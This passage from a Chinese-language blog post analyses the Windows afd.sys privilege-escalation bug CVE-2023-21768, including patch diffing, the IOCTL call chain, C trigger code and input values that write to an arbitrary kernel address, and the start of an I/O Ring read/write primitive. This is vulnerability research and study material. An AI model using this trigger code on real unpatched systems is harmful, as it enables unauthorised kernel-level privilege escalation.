    <content type="html"><![CDATA[<h1 id="CVE-2023-21768-漏洞分析"><a href="#CVE-2023-21768-漏洞分析" class="headerlink" title="CVE-2023-21768 漏洞分析"></a>CVE-2023-21768 漏洞分析</h1><h2 id="一-简介"><a href="#一-简介" class="headerlink" title="一.简介"></a>一.简介</h2><ul><li><p>我已经有一段时间没有系统地进行漏洞分析了，想要重新拾起这块技能，跟着大佬的分析文档分析分析，主要是学习I&#x2F;O Ring这种读写原语。</p></li><li><p>CVE-2023-21768 是 AFD 驱动程序 (afd.sys) 中的一个本地提权漏洞，攻击者可以通过发送特制的 IOCTL 请求触发该漏洞，利用驱动程序内部的缺陷，最终实现以更高权限执行代码。</p></li></ul><h2 id="二-搭建环境"><a href="#二-搭建环境" class="headerlink" title="二.搭建环境"></a>二.搭建环境</h2><ul><li><p>编译环境</p><ul><li>Visual Studio 2022</li><li>Windows 10 22h2 19045</li></ul></li><li><p>利用环境</p><ul><li>Windows 11 22H2 22621.819</li></ul></li><li><p>exp的编译，由于提权过程中使用到的某些技术，需要Visual Studio 2022，并且安装较高版本的SDK，我这里是Windows 11 SDK (10.0.22621.0)</p></li><li><p>环境搭建好之后，先用编译好的exp进行测试一下</p></li></ul><img src="/2025/06/23/CVE_2023_21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250621175323707.png" class="" title="png"><h2 id="三-漏洞原理"><a href="#三-漏洞原理" class="headerlink" title="三.漏洞原理"></a>三.漏洞原理</h2><ul><li>漏洞存在于AFD.sys的afd!AfdNotifyRemoveIoCompletion函数，存在我们可控制的变量，并且还有赋值操作，当构造的变量是一个地址的话，就可以将想设置的值赋值到对应的地址。</li></ul><h3 id="3-1-补丁对比"><a href="#3-1-补丁对比" class="headerlink" title="3.1.补丁对比"></a>3.1.补丁对比</h3><ul><li>AFD.sys &#x2F; Windows 11 22H2 &#x2F; 10.0.22621.608</li><li>AFD.sys &#x2F; Windows 11 22H2 &#x2F; 10.0.22621.1105</li></ul><ul><li>这里使用bindiff，如下图所示里面实际上有很多0.99的，也不是那么容易找到修改的地方。</li></ul><img src="/2025/06/23/CVE_2023_21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250622204114229.png" class="" title="png"><ul><li>如下图可以看到在进行赋值前，添加了ProbeForWrite函数，来检测目标地址是否可访问，所以这里应该就是漏洞点了。</li></ul><img src="/2025/06/23/CVE_2023_21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250622204218822.png" class="" title="png"><h3 id="3-2-函数调用链"><a href="#3-2-函数调用链" class="headerlink" title="3.2.函数调用链"></a>3.2.函数调用链</h3><ul><li><p>要利用这个漏洞，首先我们需要知道如何到达漏洞点，通过交叉引用，可以发现调用链是这样的<code>AfdFastIoDeviceControl--&gt;AfdNotifySock--&gt;AfdNotifyRemoveIoCompletion()</code></p></li><li><p>关键是搞懂AfdFastIoDeviceControl–&gt;AfdNotifySock，我们对AfdNotifySock进行交叉引用，会发现两个表，<code>AfdImmediateCallDispatch</code>和<code>AfdIrpCallDispatch</code>，这两个表里面的函数都是AFD驱动程序的调度函数，如下图所示。</p></li></ul><img src="/2025/06/23/CVE_2023_21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250622205954456.png" class="" title="png"><img src="/2025/06/23/CVE_2023_21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250622210004426.png" class="" title="png"><ul><li>接着对<code>AfdImmediateCallDispatch</code>进行交叉引用，我们将在AfdFastIoDeviceControl()函数中看到下面的代码。</li></ul><img src="/2025/06/23/CVE_2023_21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250622210658561.png" class="" title="png"><ul><li>可以通过代码中的<code>AfdIoctlTable</code>去获取自定义的控制信号，前面我们已经知道<code>AfdNotifySock</code>在<code>AfdImmediateCallDispatch</code>表中的下标是73，通过下面的图片可以知道对应的控制信号是12127h</li></ul><img src="/2025/06/23/CVE_2023_21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250622210916132.png" class="" title="png"><ul><li>知道了控制信号是12127h，就可以在用户层调用DeviceIoControl来访问到这个函数。</li></ul><h3 id="3-3-漏洞调试"><a href="#3-3-漏洞调试" class="headerlink" title="3.3.漏洞调试"></a>3.3.漏洞调试</h3><h4 id="3-3-1-afd-AfdNotifySock调试"><a href="#3-3-1-afd-AfdNotifySock调试" class="headerlink" title="3.3.1.afd!AfdNotifySock调试"></a>3.3.1.afd!AfdNotifySock调试</h4><ul><li>编写的测试代码如下，由于我们不知道传入数据是啥，所以直接传入一些字符串<code>AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLL</code></li></ul><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;Windows.h&gt;</span></span><br> <br><span class="hljs-keyword">struct</span> IO_STATUS_BLOCK<br>&#123;<br>    <span class="hljs-keyword">union</span><br>    &#123;<br>        DWORD Status;<br>        PVOID Pointer;<br>    &#125;;<br> <br>    DWORD* Information;<br>&#125;;<br> <br><span class="hljs-keyword">struct</span> UNICODE_STRING<br>&#123;<br>    USHORT Length;<br>    USHORT MaximumLength;<br>    PWSTR Buffer;<br>&#125;;<br> <br><span class="hljs-keyword">struct</span> OBJECT_ATTRIBUTES<br>&#123;<br>    ULONG Length;<br>    HANDLE RootDirectory;<br>    UNICODE_STRING* ObjectName;<br>    ULONG Attributes;<br>    PVOID SecurityDescriptor;<br>    PVOID SecurityQualityOfService;<br>&#125;;<br> <br>DWORD(WINAPI* NtDeviceIoControlFile)(HANDLE FileHandle, HANDLE Event, VOID* ApcRoutine, PVOID ApcContext, IO_STATUS_BLOCK* IoStatusBlock, ULONG IoControlCode, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength);<br>DWORD(WINAPI* NtCreateFile)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, OBJECT_ATTRIBUTES* ObjectAttributes, IO_STATUS_BLOCK* IoStatusBlock, LARGE_INTEGER* AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);<br> <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AFD_NOTIFYSOCK_IOCTL 0x12127</span><br> <br><span class="hljs-type">int</span> main()<br>&#123;<br>    <span class="hljs-comment">// get NtDeviceIoControlFile function ptr</span><br>    NtDeviceIoControlFile = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>(__stdcall*)(<span class="hljs-type">void</span>*, <span class="hljs-type">void</span>*, <span class="hljs-type">void</span>*, <span class="hljs-type">void</span>*, <span class="hljs-keyword">struct</span> IO_STATUS_BLOCK*, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, <span class="hljs-type">void</span>*, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, <span class="hljs-type">void</span>*, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>))GetProcAddress(GetModuleHandle(<span class="hljs-string">&quot;ntdll.dll&quot;</span>), <span class="hljs-string">&quot;NtDeviceIoControlFile&quot;</span>);<br>    <span class="hljs-keyword">if</span> (NtDeviceIoControlFile == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">// get NtCreateFile function ptr</span><br>    NtCreateFile = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>(__stdcall*)(<span class="hljs-type">void</span>**, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, <span class="hljs-keyword">struct</span> OBJECT_ATTRIBUTES*, <span class="hljs-keyword">struct</span> IO_STATUS_BLOCK*, <span class="hljs-keyword">union</span> _LARGE_INTEGER*, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, <span class="hljs-type">void</span>*, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>))GetProcAddress(GetModuleHandle(<span class="hljs-string">&quot;ntdll.dll&quot;</span>), <span class="hljs-string">&quot;NtCreateFile&quot;</span>);<br>    <span class="hljs-keyword">if</span> (NtCreateFile == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br> <br> <br>    IO_STATUS_BLOCK IoStatusBlock;<br>    HANDLE hEvent = <span class="hljs-literal">NULL</span>;<br>    HANDLE hSocket = <span class="hljs-literal">NULL</span>;<br>    OBJECT_ATTRIBUTES ObjectAttributes;<br>    UNICODE_STRING ObjectFilePath;<br>    DWORD dwStatus = <span class="hljs-number">0</span>;<br>    BYTE bExtendedAttributes[] =<br>    &#123;<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x50</span>,<br>        <span class="hljs-number">0x61</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xFE</span><br>    &#125;;<br> <br>    <span class="hljs-type">char</span> Data[<span class="hljs-number">0x30</span>] = <span class="hljs-string">&quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLL&quot;</span>;<br> <br>    <span class="hljs-comment">// create status event</span><br>    hEvent = CreateEvent(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (hEvent == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-comment">// error</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">// set afd endpoint path</span><br>    memset((<span class="hljs-type">void</span>*)&amp;ObjectFilePath, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ObjectFilePath));<br>    ObjectFilePath.Buffer = (PWSTR)L<span class="hljs-string">&quot;\\Device\\Afd\\Endpoint&quot;</span>;<br>    ObjectFilePath.Length = wcslen(ObjectFilePath.Buffer) * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">wchar_t</span>);<br>    ObjectFilePath.MaximumLength = ObjectFilePath.Length;<br> <br>    <span class="hljs-comment">// initialise object attributes</span><br>    memset((<span class="hljs-type">void</span>*)&amp;ObjectAttributes, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ObjectAttributes));<br>    ObjectAttributes.Length = <span class="hljs-keyword">sizeof</span>(ObjectAttributes);<br>    ObjectAttributes.ObjectName = &amp;ObjectFilePath;<br>    ObjectAttributes.Attributes = <span class="hljs-number">0x40</span>;<br> <br>    <span class="hljs-comment">// create socket handle</span><br>    IoStatusBlock.Status = <span class="hljs-number">0</span>;<br>    IoStatusBlock.Information = <span class="hljs-literal">NULL</span>;<br>    dwStatus = NtCreateFile(&amp;hSocket, MAXIMUM_ALLOWED, &amp;ObjectAttributes, &amp;IoStatusBlock, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, bExtendedAttributes, <span class="hljs-keyword">sizeof</span>(bExtendedAttributes));<br>    <span class="hljs-keyword">if</span> (dwStatus != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-comment">// error</span><br>        CloseHandle(hEvent);<br> <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    __kernel_entry NTSYSCALLAPI NTSTATUS NtDeviceIoControlFile(</span><br><span class="hljs-comment">      [in]            HANDLE           FileHandle,</span><br><span class="hljs-comment">      [in, optional]  HANDLE           Event,</span><br><span class="hljs-comment">      [in, optional]  PIO_APC_ROUTINE  ApcRoutine,</span><br><span class="hljs-comment">      [in, optional]  PVOID            ApcContext,</span><br><span class="hljs-comment">      [out]           PIO_STATUS_BLOCK IoStatusBlock,</span><br><span class="hljs-comment">      [in]            ULONG            IoControlCode,</span><br><span class="hljs-comment">      [in, optional]  PVOID            InputBuffer,</span><br><span class="hljs-comment">      [in]            ULONG            InputBufferLength,</span><br><span class="hljs-comment">      [out, optional] PVOID            OutputBuffer,</span><br><span class="hljs-comment">      [in]            ULONG            OutputBufferLength</span><br><span class="hljs-comment">    );</span><br><span class="hljs-comment">    */</span><br>    NtDeviceIoControlFile(hSocket, hEvent, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;IoStatusBlock, AFD_NOTIFYSOCK_IOCTL, &amp;Data, <span class="hljs-number">0x30</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br> <br> <br>    <span class="hljs-keyword">if</span> (INVALID_HANDLE_VALUE != hSocket)<br>    &#123;<br>        CloseHandle(hSocket);<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> != hEvent)<br>    &#123;<br>        CloseHandle(hEvent);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>在<code>afd!AfdNotifySock</code>打上断点，断下来，r9寄存器指向我们的输入。</li></ul><img src="/2025/06/23/CVE_2023_21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250622213234860.png" class="" title="png"><ul><li>在IDA中查看<code>AfdNotifySock</code>函数</li></ul><img src="/2025/06/23/CVE_2023_21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250622213507731.png" class="" title="png"><ul><li>如上图所示第一个判断，需要满足</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">InputBufferLength</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">0</span>x30<br><span class="hljs-attribute">OutputBufferLength</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0</span><br><span class="hljs-attribute">OutputBuffer</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><ul><li>继续调试，发现对<code>InputBuffer</code>的一些值进行了判断，并且将<code>*(void **)_InputBuffer</code>传入了 <code>ObReferenceObjectByHandle()</code>函数。为了方便分析所以对InputBuffer的一些值进行设置，通过整个函数中出现InputBuffer，可得到下面的结构体。</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs abnf">typedef struct AFD_NOTIFYSOCK_DATA<br>&#123;<br>    HANDLE HandleIoCompletion<span class="hljs-comment">;</span><br>    PVOID pData1<span class="hljs-comment">;</span><br>    PVOID pData2<span class="hljs-comment">;</span><br>    PVOID pPwnPtr<span class="hljs-comment">;</span><br>    DWORD dwCounter<span class="hljs-comment">;</span><br>    DWORD dwTimeout<span class="hljs-comment">;</span><br>    DWORD dwLen<span class="hljs-comment">;</span><br>    char lol[<span class="hljs-number">0</span>x4]<span class="hljs-comment">;</span><br>&#125;AFD_NOTIFYSOCK_DATA<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><ul><li>将上面结构体导入ida，让伪代码更加清晰。</li></ul><img src="/2025/06/23/CVE_2023_21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250622214142326.png" class="" title="png"><ul><li><p>上面的一些if判断比较容易，重点是如何绕过<code>ObReferenceObjectByHandle()</code>，其返回值必须&gt;&#x3D;0</p><ul><li>可以通过CreateIoCompletionPort或者NtCreateIoCompletion函数来创建有效的IO完成对象的句柄，从而绕过<code>ObReferenceObjectByHandle()</code>。</li></ul></li><li><p>继续向下，有个while循环，貌似需要<code>InputBuffer-&gt;pData1</code>满足一些条件</p></li></ul><img src="/2025/06/23/CVE_2023_21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250622215112668.png" class="" title="png"><ul><li><p>所以现在设置</p><ul><li><p>Data.pData1 &#x3D; VirtualAlloc(NULL, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</p></li><li><p>Data.dwCounter &#x3D; 0x1;</p></li></ul></li><li><p>然后就可以到达<code>AfdNotifyRemoveIoCompletion()</code>了，目前我们的Data如下，Data.pData2 还未出现，4byte，目前来说不为空即可，但是根据结构体的定义，将其设置为一个地址。</p></li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">Data.HandleIoCompletion</span> = hCompletion<span class="hljs-comment">;</span><br><span class="hljs-attr">Data.pData1</span> = VirtualAlloc(NULL, <span class="hljs-number">0</span>x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)<span class="hljs-comment">;</span><br><span class="hljs-attr">Data.pData2</span> = &amp;test<span class="hljs-comment">; //一个地址</span><br><span class="hljs-attr">Data.dwCounter</span> = <span class="hljs-number">0</span>x1<span class="hljs-comment">;</span><br><span class="hljs-attr">Data.dwLen</span> = <span class="hljs-number">0</span>x1<span class="hljs-comment">;</span><br><span class="hljs-attr">Data.pPwnPtr</span> = &amp;test<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h4 id="3-3-2-afd-AfdNotifyRemoveIoCompletion调试"><a href="#3-3-2-afd-AfdNotifyRemoveIoCompletion调试" class="headerlink" title="3.3.2.afd!AfdNotifyRemoveIoCompletion调试"></a>3.3.2.afd!AfdNotifyRemoveIoCompletion调试</h4><ul><li>接下来分析<code>AfdNotifyRemoveIoCompletion()</code>，看看需要绕过那些检测，从而到达漏洞点。</li></ul><img src="/2025/06/23/CVE_2023_21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250622215636436.png" class="" title="png"><ul><li><p>需要满足：</p><ul><li><p>InputBuffer-&gt;dwLen!&#x3D;0</p></li><li><p>InputBuffer-&gt;pData2指向一块内存空间，可写</p></li></ul></li><li><p>接下来我们就遇到了<code>IoRemoveIoCompletion</code>函数，想要到到达漏洞点，貌似我们需要让其返回STATUS_SUCCESS(0)。</p></li></ul><img src="/2025/06/23/CVE_2023_21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250622215811360.png" class="" title="png"><ul><li><p>通过搜索得知<code>IoRemoveIoCompletion</code>是Windows Driver Kit(WDK)提供的函数，用于将已完成的I<code>/</code>O操作从I<code>/</code>O完成端口的完成队列中移除并返回。</p></li><li><p>在Windows平台下，如果您想要向I&#x2F;O完成端口的完成队列中添加已完成的I&#x2F;O操作，您可以使用以下函数：</p><ol><li><code>NtSetIoCompletion</code>：该函数是Windows系统调用之一，可将已完成的I&#x2F;O操作添加到指定的I&#x2F;O完成端口的完成队列中。该函数适用于用户模式程序使用的I&#x2F;O完整端口。</li></ol></li></ul><p>​    2.<code>IoSetIoCompletion</code>：该函数是Windows驱动程序开发包(WDK)中的一部分，与<code>NtSetIoCompletion</code>函数相似。驱动程序可以使用该函数将I&#x2F;O操作添加到指定的I&#x2F;O完成端口的完成队列中。该函数适用于驱动程序中使用的I&#x2F;O完整端口。</p><ul><li><p>这两个函数的作用类似，它们都用于将已完成的I&#x2F;O操作添加到指定的I&#x2F;O完成端口的完成队列中。这些函数调用后，I&#x2F;O管理器将在IRP的调用线程上调用已完成I&#x2F;O请求的完成例程。</p></li><li><p>需要注意的是，I&#x2F;O完成端口及其相关的函数和结构体只适用于Windows操作系统。如果您在使用其他操作系统，可能需要查找其他方法来管理已完成的I&#x2F;O操作。</p></li><li><p>所以通过如下代码到达漏洞触发点</p></li></ul><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs lasso">NtCreateIoCompletion(&amp;hCompletion, MAXIMUM_ALLOWED, <span class="hljs-built_in">NULL</span>, <span class="hljs-number">1</span>);<br>NtSetIoCompletion(hCompletion, <span class="hljs-number">0</span>, &amp;IoStatusBlock, <span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>);<br> <br><span class="hljs-built_in">Data</span>.HandleIoCompletion = hCompletion;<br><span class="hljs-built_in">Data</span>.pData1 = VirtualAlloc(<span class="hljs-built_in">NULL</span>, <span class="hljs-number">0x2000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);<br><span class="hljs-built_in">Data</span>.pData2 = VirtualAlloc(<span class="hljs-built_in">NULL</span>, <span class="hljs-number">0x2000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);<br><span class="hljs-built_in">Data</span>.dwCounter = <span class="hljs-number">0x1</span>;<br><span class="hljs-built_in">Data</span>.dwLen = <span class="hljs-number">0x1</span>;<br><span class="hljs-built_in">Data</span>.dwTimeout = <span class="hljs-number">1000</span>;<br><span class="hljs-built_in">Data</span>.pPwnPtr = &amp;test;<br></code></pre></td></tr></table></figure><ul><li>可以看到成功返回并触发了漏洞</li></ul><img src="/2025/06/23/CVE_2023_21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250622221040913.png" class="" title="png"><h4 id="3-3-3-IoRemoveIoCompletion"><a href="#3-3-3-IoRemoveIoCompletion" class="headerlink" title="3.3.3.IoRemoveIoCompletion"></a>3.3.3.IoRemoveIoCompletion</h4><ul><li>目前解决了关于如何到达漏洞点的问题，但是如何设置我们想要的值呢，根据<code>afd!AfdNotifyRemoveIoCompletion</code>的分析来看，貌似writevalue是由IoRemoveIoCompletion这个函数来决定的，所以我们需要对这个函数进行分析。</li><li>这个函数来自于ntoskrnl.exe，找到函数对应的代码，可以看到，writevalue的值是由KeRemoveQueueEx函数返回的</li></ul><img src="/2025/06/23/CVE_2023_21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250622221952670.png" class="" title="png"><ul><li>这个函数的作用是让等待队列中的线程或进程不再等待，可以继续执行。如果函数成功地将线程或进程从等待队列中移除，则返回不为0的值；否则，返回0。需要注意的是，一旦线程或进程从等待队列中移除，它的状态会发生变化，后续操作需要根据具体情况而定。</li><li>根据调试情况来看，这里的返回值，貌似一直都是0x1，这应该代表成功将一个线程或进程从等待队列中移除吧，或许有其他手段来移除多个线程或进程，从而返回想要的值。</li></ul><h2 id="四-I-O-Ring"><a href="#四-I-O-Ring" class="headerlink" title="四.I&#x2F;O Ring"></a>四.I&#x2F;O Ring</h2><ul><li><p>目前我们可以利用漏洞完成任意地址赋值为0x1，这离提权实际上还远远不够，想要提权，至少需要实现任意地址写，任意地址读。</p></li><li><p>关于I&#x2F;O Ring的介绍，Yarden Shafir发布了很多文章，其中就有讲的一种特定于 Windows 11 22H2+ 的后渗透原语，非常有价值的后渗透原语，只需要一个内核任意写漏洞，甚至可以向本漏洞一样，只能固定写入0x1，都可以采用此后渗透源语来进行利用。</p><ul><li><a href="https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/">https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/</a></li><li><a href="https://windows-internals.com/one-year-to-i-o-ring-what-changed/">https://windows-internals.com/one-year-to-i-o-ring-what-changed/</a></li><li><a href="https://windows-internals.com/i-o-rings-when-one-i-o-operation-is-not-enough/">https://windows-internals.com/i-o-rings-when-one-i-o-operation-is-not-enough/</a></li></ul></li><li><p>下面我将以简略的方式，讲述下这个技术的使用，由于本人技术有限，如有错误，请谅解。</p></li></ul><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">I</span><span class="hljs-operator">/</span><span class="hljs-built_in">O</span> 环是一种新的异步 <span class="hljs-built_in">I</span><span class="hljs-operator">/</span><span class="hljs-built_in">O</span> 机制，允许应用程序将尽可能多的<span class="hljs-built_in">I</span><span class="hljs-operator">/</span><span class="hljs-built_in">O</span> 操作排入队列，然后使用单个调用一次性提交所有操作<span class="hljs-operator">`</span><span class="hljs-variable">API</span><span class="hljs-operator">`</span>。<br><br><span class="hljs-variable">Windows</span> <span class="hljs-number">11</span> <span class="hljs-number">22</span><span class="hljs-variable">H2</span> 